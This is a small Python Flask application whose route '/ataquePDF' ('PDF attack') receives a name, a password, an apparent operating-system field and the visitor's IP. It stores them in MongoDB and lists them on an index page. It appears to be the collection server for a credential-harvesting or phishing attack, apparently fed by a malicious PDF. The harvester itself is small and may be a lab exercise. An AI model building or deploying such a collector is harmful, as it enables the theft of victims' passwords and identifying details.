from flask import Flask, request, render_template, redirect, url_for
from flask_pymongo import PyMongo
from bson.json_util import loads, dumps

app = Flask(__name__, template_folder='templates')
app.config['MONGO_URI']='mongodb://localhost/pythonmongodb' 
mongo = PyMongo(app)

@app.route('/')
def index():
    find = mongo.db.nicob.find()
    return render_template('index.html', find = find )

@app.route('/ataquePDF', methods = ['GET'] )
def ataquePDF():
    if(request.method == 'GET'):
        nombre = request.args.get('nombre')
        contrasena = request.args.get('contrasena')
        ip =  request.remote_addr
        s_op = request.args.get('s_op')

        mongo.db.nicob.insert({
            'nombre':nombre,
            'contrasena':contrasena,
            'ip': ip,
            's_op':s_op
            })
        return redirect(url_for('index'))
    else:
        return 'no funciono xd'


if __name__ =="__main__":
    app.run(host='192.168.61.207', port=3000)
